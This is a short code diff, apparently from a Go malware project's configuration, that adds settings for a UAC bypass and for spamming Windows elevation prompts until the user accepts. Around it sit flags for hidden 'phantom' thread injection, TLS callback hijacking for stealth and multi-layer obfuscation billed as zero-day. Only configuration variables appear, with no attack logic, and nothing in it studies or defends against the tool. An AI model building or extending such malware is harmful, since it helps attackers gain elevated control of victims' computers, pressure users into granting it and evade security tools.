@@ -78,6 +78,12 @@ var PhantomThreadPoolSize = 5    // Number of pre-created phantom threads
 var PhantomTLSInjection = true   // Use TLS callback hijacking for extra stealth
 var PhantomChainExecution = true // Distribute execution across multiple phantom threads
 
+// UAC Bypass and Privilege Escalation
+var EnableUACBypass = true      // Attempt to bypass UAC and gain elevated privileges
+var UACSpamEnabled = false      // Spam UAC prompts until user accepts (aggressive)
+var UACSpamAttempts = 10        // Number of UAC prompts to show
+var UACSpamDelay = 500          // Milliseconds between UAC prompts
+
 // Quantum Polymorphic Encoding (NOVEL TECHNIQUE #4 - ZERO-DAY OBFUSCATION)
 var EnableQuantumObfuscation = true    // Multi-layer quantum encoding (7 encoding layers)
 var QuantumEntropyEncoding = true      // Use true hardware entropy as encryption key
